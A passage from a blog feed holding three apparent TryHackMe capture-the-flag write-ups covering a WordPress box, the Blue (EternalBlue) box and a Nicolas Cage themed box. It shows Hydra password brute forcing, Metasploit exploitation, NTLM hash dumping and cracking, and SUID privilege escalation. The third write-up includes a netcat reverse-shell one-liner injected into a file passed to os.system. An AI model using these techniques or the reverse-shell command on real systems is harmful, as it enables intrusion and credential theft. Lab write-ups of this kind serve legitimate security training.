list.\n┌──(kali㉿kali)-[~] └─$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali 10.10.129.188 blog.thm # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 1.2 Exploration Looking and exploring the website we have:\n comments and feed in the meta section not too interesting Looked at the posts. Nothing in the post too interesting. Looked at both the authors (click on authors), we can see their usernames  Interesting! So, bjoel and kwheel are two usernames we have.\n1.3 Gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u 10.10.129.188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q /rss (Status: 301) [Size: 0] [--\u0026gt; http://10.10.129.188/feed/] /login (Status: 302) [Size: 0] [--\u0026gt; http://blog.thm/wp-login.php] /0 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.129.188/0/] /feed (Status: 301) [Size: 0] [--\u0026gt; http://10.10.129.188/feed/] /atom (Status: 301) [Size: 0] [--\u0026gt; http://10.10.129.188/feed/atom/] /wp-content (Status: 301) [Size: 319] [--\u0026gt; http://10.10.129.188/wp-content/] /admin (Status: 302) [Size: 0] [--\u0026gt; http://blog.thm/wp-admin/] /rss2 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.129.188/feed/] /wp-includes (Status: 301) [Size: 320] [--\u0026gt; http://10.10.129.188/wp-includes/] /rdf (Status: 301) [Size: 0] [--\u0026gt; http://10.10.129.188/feed/rdf/] /page1 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.129.188/] /' (Status: 301) [Size: 0] [--\u0026gt; http://10.10.129.188/] /dashboard (Status: 302) [Size: 0] [--\u0026gt; http://blog.thm/wp-admin/] /%20 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.129.188/] Nothing interesting. Looks like a WordPress CMS (no surprises - the template is from Frontity iirc).\n1.4 SMB Let\u0026rsquo;s explore the SMB port that was open.\n┌──(kali㉿kali)-[/tmp] └─$ smbclient -L 10.10.129.188 -N Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers BillySMB Disk Billy's local SMB Share IPC$ IPC IPC Service (blog server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available ┌──(kali㉿kali)-[/tmp] └─$ smbclient //10.10.129.188/BillySMB -N Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Tue May 26 14:17:05 2020 .. D 0 Tue May 26 13:58:23 2020 Alice-White-Rabbit.jpg N 33378 Tue May 26 14:17:01 2020 tswift.mp4 N 1236733 Tue May 26 14:13:45 2020 check-this.png N 3082 Tue May 26 14:13:43 2020 15413192 blocks of size 1024. 9788312 blocks available smb: \\\u0026gt; get Alice-White-Rabbit.jpg getting file \\Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (27.3 KiloBytes/sec) (average 27.3 KiloBytes/sec) smb: \\\u0026gt; get check-this.png getting file \\check-this.png of size 3082 as check-this.png (3.4 KiloBytes/sec) (average 17.0 KiloBytes/sec) smb: \\\u0026gt; I have a feeling its a rickroll. Also, taylor swift uh huh. Plus, the author of the room mentioned to not go down \u0026ldquo;the rabbit hole\u0026rdquo;.\nWent to the qrcode link. Here\u0026rsquo;s not a rickroll XD\nhttps://www.youtube.com/watch?v=eFTLKWw542g\nClearly the rabbit hole.\n1.5 Bruteforce passwords I cant seem to find any creds lying around. So we\u0026rsquo;ll try getting into bjoel and kwheel\u0026rsquo;s accounts by bruteforcing with Hydra.\nFirst we want the form structure. So, I fired up burpsuite, and got the following:\nPOST /wp-login.php HTTP/1.1 Host: blog.thm ... log=admin\u0026amp;pwd=admin\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F\u0026amp;testcookie=1 Okay great! Let\u0026rsquo;s go for Hydra now.\n┌──(kali㉿kali)-[~] └─$ hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form \u0026quot;/wp-login.php:log=^USER^\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F\u0026amp;testcookie=1:F=password\u0026quot; Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-08 06:33:32 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-form://blog.thm:80/wp-login.php:log=^USER^\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F\u0026amp;testcookie=1:F=password [STATUS] 847.00 tries/min, 847 tries in 00:01h, 14343552 to do in 282:15h, 16 active [STATUS] 845.00 tries/min, 2535 tries in 00:03h, 14341864 to do in 282:53h, 16 active [80][http-post-form] host: blog.thm login: kwheel password: {hidden} 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-08 06:37:11 2. Foothold So, now that we have the credentials \u0026hellip; so now what? Well whenever in doubt, we go back to the nmap scan. We see that the version 5.0 is being used. Looking it up, we have something tasty :D\nLet\u0026rsquo;s fire up msfconsole with the exploit here in detail and exploit-db. Setup options and then check. Looks vulnerable, lesgooo.\nmsf6 exploit(multi/http/wp_crop_rce) \u0026gt; exploit [*] Started reverse TCP handler on 10.8.150.214:4444 [*] Authenticating with WordPress using kwheel:cutiepie1... [+] Authenticated with WordPress [*] Preparing payload... [*] Uploading payload [+] Image uploaded [*] Including into theme [*] Sending stage (39282 bytes) to 10.10.21.78 [*] Attempting to clean up files... [*] Meterpreter session 2 opened (10.8.150.214:4444 -\u0026gt; 10.10.21.78:35590) at 2021-05-08 06:59:17 -0400 meterpreter \u0026gt; shell Process 1745 created. Channel 1 created. bash -i bash: cannot set terminal process group (983): Inappropriate ioctl for device bash: no job control in this shell www-data@blog:/var/www/cms$ So I checked the bjoel/user.txt, but \u0026hellip; the classic \u0026ldquo;TRY HARDER\u0026rdquo; was shown to me ;-;\nLet\u0026rsquo;s now look for the PrivEsc.\n3. Priv Esc Let\u0026rsquo;s first look at who all have the set-uid bit.\nwww-data@blog:/var/www/cms$ find / -type f -perm -u=s 2\u0026gt;/dev/null find / -type f -perm -u=s 2\u0026gt;/dev/null /usr/bin/passwd /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/chsh /usr/bin/newuidmap /usr/bin/pkexec /usr/bin/chfn /usr/bin/sudo /usr/bin/at /usr/bin/newgidmap /usr/bin/traceroute6.iputils /usr/sbin/checker /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/snapd/snap-confine /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /bin/mount /bin/fusermount /bin/umount /bin/ping /bin/su /snap/core/8268/bin/mount /snap/core/8268/bin/ping ... The thing that pops out is: /usr/sbin/checker\nwww-data@blog:/var/www/cms$ /usr/sbin/checker /usr/sbin/checker Not an Admin www-data@blog:/var/www/cms$ strings /usr/sbin/checker strings /usr/sbin/checker /lib64/ld-linux-x86-64.so.2 libc.so.6 setuid puts getenv system __cxa_finalize __libc_start_main GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable =9 AWAVI AUATL []A\\A]A^A_ admin /bin/bash Not an Admin www-data@blog:/var/www/cms$ ltrace /usr/sbin/checker ltrace /usr/sbin/checker getenv(\u0026quot;admin\u0026quot;) = nil puts(\u0026quot;Not an Admin\u0026quot;) = 13 Not an Admin +++ exited (status 0) +++ Okay so. At this point I used nc to get the binary to my machine, and then, much later, realised that I went too complicated opening radare lol.\nHere\u0026rsquo;s what to do instead. Realise that getenv(\u0026quot;admin\u0026quot;) means that we need some environmental variable. So,\nwww-data@blog:/var/www/cms$ export admin=admin export admin=admin www-data@blog:/var/www/cms$ /usr/sbin/checker /usr/sbin/checker whoami root Very nice. Let\u0026rsquo;s also get the user flag while we are at it XD\nroot@blog:/var/www/cms# find / -type f -name user.txt 2\u0026gt;/dev/null find / -type f -name user.txt 2\u0026gt;/dev/null /home/bjoel/user.txt /media/usb/user.txt And we are done!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/rP25U0x.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-blog-writeup/","title":"TryHackMe: Blog Writeup"},{"content":"1. Recon Reconnaissance\nScan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room) ❯ nmap --script=vuln -sV -A 10.10.233.113\nNmap scan report for 10.10.233.113 Host is up (0.43s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? | rdp-vuln-ms12-020: | VULNERABLE: | MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability | State: VULNERABLE | IDs: CVE:CVE-2012-0152 | Risk factor: Medium CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P) | Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service. | | Disclosure date: 2012-03-13 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152 | http://technet.microsoft.com/en-us/security/bulletin/ms12-020 | | MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability | State: VULNERABLE | IDs: CVE:CVE-2012-0002 | Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C) | Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system. | | Disclosure date: 2012-03-13 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002 |_ http://technet.microsoft.com/en-us/security/bulletin/ms12-020 |_ssl-ccs-injection: No reply from server (TIMEOUT) |_sslv2-drown: 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 161.25 seconds How many ports are open with a port number under 1000? 3\nWhat is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) ms17-010\n 2. Gain Access Start metasploit done\nFind the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/\u0026hellip;\u0026hellip;..) msf6 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 1 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 2 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 3 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 4 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 5 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce exploit/windows/smb/ms17_010_eternalblue\nShow options and set the one required value. What is the name of this value? (All caps for submission) msf6 \u0026gt; use 2 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set MY_IP RHOSTS =\u0026gt; MY_IP RHOSTS\nUsually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter: set payload windows/x64/shell/reverse_tcp\nWith that done, run the exploit!  msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; exploit [*] Started reverse TCP handler on 10.2.60.96:4444 [*] 10.10.233.113:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.233.113:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.233.113:445 - Scanned 1 of 1 hosts (100% complete) [*] 10.10.233.113:445 - Connecting to target for exploitation. [+] 10.10.233.113:445 - Connection established for exploitation. [+] 10.10.233.113:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.233.113:445 - CORE raw buffer dump (42 bytes) [*] 10.10.233.113:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.233.113:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.233.113:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.233.113:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.233.113:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.233.113:445 - Sending all but last fragment of exploit packet [*] 10.10.233.113:445 - Starting non-paged pool grooming [+] 10.10.233.113:445 - Sending SMBv2 buffers [+] 10.10.233.113:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.233.113:445 - Sending final SMBv2 buffers. [*] 10.10.233.113:445 - Sending last fragment of exploit packet! [*] 10.10.233.113:445 - Receiving response from exploit packet [+] 10.10.233.113:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.233.113:445 - Sending egg to corrupted connection. [*] 10.10.233.113:445 - Triggering free of corrupted buffer. [*] Sending stage (336 bytes) to 10.10.233.113 [*] Command shell session 1 opened (10.2.60.96:4444 -\u0026gt; 10.10.233.113:49214) at 2021-02-01 23:22:21 -0500 [+] 10.10.233.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.233.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.233.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. done\n 3. Escalate If you haven\u0026rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)  msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; search shell_to_meterpreter Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 post/multi/manage/shell_to_meterpreter normal No Shell to Meterpreter Upgrade Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter post/multi/manage/shell_to_meterpreter\nSelect this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer) msf6 post(multi/manage/shell_to_meterpreter) \u0026gt; show options Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on. Set the required option, you may need to list all of the sessions to find your target here. msf6 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows 10.2.60.96:4444 -\u0026gt; 10.10.233.113:49214 (10.10.233.113) msf6 post(multi/manage/shell_to_meterpreter) \u0026gt; set SESSION 1 SESSION =\u0026gt; 1 SESSION\nRun! If this doesn\u0026rsquo;t work, try completing the exploit from the previous task once more. msf6 post(multi/manage/shell_to_meterpreter) \u0026gt; exploit [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.2.60.96:4433 [*] Post module execution completed msf6 post(multi/manage/shell_to_meterpreter) \u0026gt; [*] Sending stage (175174 bytes) to 10.10.233.113 [*] Meterpreter session 2 opened (10.2.60.96:4433 -\u0026gt; 10.10.233.113:49229) at 2021-02-01 23:34:34 -0500 [*] Stopping exploit/multi/handler Note: we could also try sessions -u 1 -u \u0026lt;opt\u0026gt; Upgrade a shell to a meterpreter session on many platforms\ntried though, didnt work\nOnce the meterpreter shell conversion completes, select that session for use. run: session 2\nVerify that we have escalated to NT AUTHORITY\\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command \u0026lsquo;shell\u0026rsquo; and run \u0026lsquo;whoami\u0026rsquo;. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. meterpreter \u0026gt; shell Process 1400 created. Channel 1 created. Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system List all of the processes running via the \u0026lsquo;ps\u0026rsquo; command. Just because we are system doesn\u0026rsquo;t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\\SYSTEM and write down the process id (far left column). done\nMigrate to this process using the \u0026lsquo;migrate PROCESS_ID\u0026rsquo; command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. done\n 4. Cracking Within our elevated meterpreter shell, run the command \u0026lsquo;hashdump\u0026rsquo;. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: Jon\nCopy this password hash to a file and research how to crack it. What is the cracked password? ❯ hashcat -a 0 -m 1000 crack.txt /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================= * Device #1: pthread-Intel(R) Core(TM) i3-6006U CPU @ 2.00GHz, 2726/2790 MB (1024 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers applied: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash ATTENTION! Pure (unoptimized) backend kernels selected. Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance. If you want to switch to optimized backend kernels, append -O to your commandline. See the above message to find out about the exact limits. Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled. Host memory required for this attack: 65 MB Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22 Session..........: hashcat Status...........: Cracked Hash.Name........: NTLM Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d Time.Started.....: Tue Feb 2 00:08:23 2021 (6 secs) Time.Estimated...: Tue Feb 2 00:08:29 2021 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1705.7 kH/s (0.39ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 10203136/14344385 (71.13%) Rejected.........: 0/10203136 (0.00%) Restore.Point....: 10199040/14344385 (71.10%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: alsinah -\u0026gt; alonsouriel Started: Tue Feb 2 00:07:53 2021 Stopped: Tue Feb 2 00:08:32 2021 alqfna22\n5. Find Flags meterpreter \u0026gt; search -f flag*.txt Found 6 results... c:\\Documents and Settings\\Jon\\Documents\\flag3.txt (37 bytes) c:\\Documents and Settings\\Jon\\My Documents\\flag3.txt (37 bytes) c:\\flag1.txt (24 bytes) c:\\Users\\Jon\\Documents\\flag3.txt (37 bytes) c:\\Users\\Jon\\My Documents\\flag3.txt (37 bytes) c:\\Windows\\System32\\config\\flag2.txt (34 bytes) Flag1? This flag can be found at the system root. 1337\nFlag2? This flag can be found at the location where passwords are stored within Windows. 1337\nFlag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 1337\n ","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/TqRvxBA.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-blue-writeup/","title":"TryHackMe: Blue Writeup"},{"content":"Play\n1. Scanning \u0026amp; Enumeration We do the below scans in parallel.\n1.1. Port Scanning Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 396 May 25 2020 dad_tasks | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.17.8.184 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA) | 256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA) |_ 256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Nicholas Cage Stories Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Info gathered:\n FTP running, with anonymous login SSH open HTTP open, running a website  1.2. Web Enumeration I usually try out both of the below lists, to get a complete idea and not miss out on anything.\n┌──(kali㉿kali)-[~] └─$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -x 'php,html,txt' -t 32 -q -u 10.10.100.66 /.htpasswd.txt (Status: 403) [Size: 277] /.htaccess.php (Status: 403) [Size: 277] /.htpasswd (Status: 403) [Size: 277] /.htaccess.html (Status: 403) [Size: 277] /.htpasswd.php (Status: 403) [Size: 277] /.htaccess.txt (Status: 403) [Size: 277] /.htpasswd.html (Status: 403) [Size: 277] /.htaccess (Status: 403) [Size: 277] /contracts (Status: 301) [Size: 316] [--\u0026gt; http://10.10.100.66/contracts/] /html (Status: 301) [Size: 311] [--\u0026gt; http://10.10.100.66/html/] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.100.66/images/] /index.html (Status: 200) [Size: 2453] /scripts (Status: 301) [Size: 314] [--\u0026gt; http://10.10.100.66/scripts/] /server-status (Status: 403) [Size: 277] ┌──(kali㉿kali)-[~] └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q -u 10.10.100.66 /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.100.66/images/] /index.html (Status: 200) [Size: 2453] /html (Status: 301) [Size: 311] [--\u0026gt; http://10.10.100.66/html/] /scripts (Status: 301) [Size: 314] [--\u0026gt; http://10.10.100.66/scripts/] /contracts (Status: 301) [Size: 316] [--\u0026gt; http://10.10.100.66/contracts/] /auditions (Status: 301) [Size: 316] [--\u0026gt; http://10.10.100.66/auditions/] Interesting looking things:\n contracts auditions sripts  1.3. Web Exploration Website homepage All the links are dead.\n/contracts/ Useless.\n/auditions/ an mp3 file found in the auditions directory. We can look into this later if needed. 1.4. FTP Let\u0026rsquo;s get the interesting looking file from FTP, as anonymous login is allowed.\n┌──(kali㉿kali)-[~] └─$ ftp 10.10.100.66 Connected to 10.10.100.66. 220 (vsFTPd 3.0.3) Name (10.10.100.66:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 0 4096 May 25 2020 . drwxr-xr-x 2 0 0 4096 May 25 2020 .. -rw-r--r-- 1 0 0 396 May 25 2020 dad_tasks 226 Directory send OK. ftp\u0026gt; get dad_tasks local: dad_tasks remote: dad_tasks 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for dad_tasks (396 bytes). 226 Transfer complete. 396 bytes received in 0.08 secs (4.8631 kB/s) ftp\u0026gt; 221 Goodbye. We get: UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQU{rest_is_yeeted_kekw}\n-base64-\u0026gt;\nQapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!! Sfw. Kajnmb xsi owuowge Faz. Tml fkfr qgseik ag oqeibx Eljwx. Xil bqi aiklbywqe Rsfv. Zwel vvm imel sumebt lqwdsfk Yejr. Tqenl Vsw svnt \u0026quot;urqsjetpwbn einyjamu\u0026quot; wf. Iz glww A ykftef.... {mmm_yum} -vingere-\u0026gt;\nDads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!! One. Revamp the website Two. Put more quotes in script Three. Buy bee pesticide Four. Help him with acting lessons Five. Teach Dad what \u0026quot;information security\u0026quot; is. In case I forget.... {yee_haww} Now, what could the username be? Look at the questions in the THM room!\n2. Foothold Using SSH, we can login.\nweston@national-treasure:~$ id uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage) Doing some preliminary exploration, we get:\nweston@national-treasure:~$ find / -type f -group cage 2\u0026gt; /dev/null /opt/.dads_scripts/spread_the_quotes.py /opt/.dads_scripts/.files/.quotes Checking out the first file.\nweston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py #!/usr/bin/env python #Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!) import os import random lines = open(\u0026quot;/opt/.dads_scripts/.files/.quotes\u0026quot;).read().splitlines() quote = random.choice(lines) os.system(\u0026quot;wall \u0026quot; + quote) The second file is a list of quotes. Here\u0026rsquo;s what\u0026rsquo;s happening:\n the second file is opened we read the lines in the file, and split them by line-end-marker we store the lines in a variable called lines we choose one random item from a list os.system(\u0026ldquo;wall xyz\u0026rdquo;) displays the word xyz on all user\u0026rsquo;s terminals.  Now, what could the possible paths to exploit be? I could think of python library hijacking if we have the right permissions.\n3. Priv Esc 3.1. Python Library Hijacking (FAIL) weston@national-treasure:~$ ls -la /opt/.dads_scripts/.files/.quotes -rwxrw---- 1 cage cage 347 Jun 13 10:30 /opt/.dads_scripts/.files/.quotes weston@national-treasure:~$ ls -la /opt/.dads_scripts/spread_the_quotes.py -rwxr--r-- 1 cage cage 255 May 26 2020 /opt/.dads_scripts/spread_the_quotes.py I looked at the directory\nweston@national-treasure:/opt/.dads_scripts$ ls -la total 16 drwxr-xr-x 3 cage cage 4096 May 26 2020 . drwxr-xr-x 3 root root 4096 May 25 2020 .. drwxrwxr-x 2 cage cage 4096 May 25 2020 .files -rwxr--r-- 1 cage cage 255 May 26 2020 spread_the_quotes.py And clearly, we can not write our own files here. Fail.\n3.2. Using os.system() What if we can make use of the os.system() command? We have the right permissions to override the stuff in the quotes. We can thus put in a reverse shell spawner!\nweston@national-treasure:~$ echo \u0026quot;pwn; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u0026gt;\u0026amp;1|nc 10.17.8.184 4444 \u0026gt;/tmp/f\u0026quot; \u0026gt; /opt/.dads_scripts/.files/.quotes \u0026hellip; wait for it \u0026hellip;\nNice :D\n3.3. Vertical PrivEsc Make sure to upgrade your shell using python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\nLooking at emails,\ncage@national-treasure:~/email_backup$ cat email_1 cat email_1 From - SeanArcher@BigManAgents.com To - Cage@nationaltreasure.com Hey Cage! There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the planning stages at the moment. I've put a good word in for you, if you're lucky we might be able to get you a part of an angry shop keeping or something? Would you be up for that, the money would be good and it'd look 